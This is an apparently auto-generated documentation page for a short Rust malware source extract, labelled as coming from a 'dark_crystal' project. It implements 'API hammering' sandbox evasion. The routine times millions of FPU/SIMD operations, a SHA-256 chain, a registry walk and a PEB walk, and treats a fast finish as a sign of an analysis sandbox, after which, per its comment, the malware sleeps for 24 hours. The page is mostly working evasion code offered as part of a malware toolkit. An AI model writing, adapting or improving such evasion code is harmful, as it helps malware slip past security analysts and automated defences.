# api_hammering

| Field | Value |
|-------|-------|
| **Source** | `source-extracts/api_hammering.rs` |
| **Lines** | 31 |

## Constants

- `DEFAULT_ITERATIONS`: `u32` = `3_000_000`
- `DEFAULT_MIN_ELAPSED_SECS`: `u64` = `2`

## Public API

### `run_fsm` (line 13)
```rust
pub fn run_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool
```

## Full Source

```rust
// Source: dark_crystal/crowd/src/hammering.rs
// Technique: T013 - API Hammering (Sandbox clock-acceleration detection)
// Tier: C
//
// 3M FPU/SIMD iterations to defeat sandbox acceleration.
// SHA-256 alone can be accelerated via SHA-NI; FPU transcendental ops (FSIN, FSQRT)
// and packed SIMD (MULPD, ADDPD) require the actual execution unit.
// If 3M ops complete in < 2s → sandbox → 24h sleep (not exit).

const DEFAULT_ITERATIONS: u32 = 3_000_000;
const DEFAULT_MIN_ELAPSED_SECS: u64 = 2;

pub fn run_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool {
    let seed = ctx.config.hammer_seed;
    if seed == 0 { return true; }

    let iters    = if ctx.config.hammer_iters == 0 { DEFAULT_ITERATIONS } else { ctx.config.hammer_iters };
    let min_secs = if ctx.config.hammer_min_secs == 0 { DEFAULT_MIN_ELAPSED_SECS } else { ctx.config.hammer_min_secs };
    let start = Instant::now();

    fpu_simd_waste(seed, iters);      // x87 FPU + SSE2 packed doubles
    let _ = sha256_chain(seed, 100_000); // SHA-256 chain as entropy source
    registry_deep_walk();              // Registry walk for realism
    verify_loaded_modules();           // PEB walk

    let elapsed = start.elapsed();
    if elapsed < Duration::from_secs(min_secs) {
        return false; // Clock acceleration detected → sandbox
    }
    true
}

```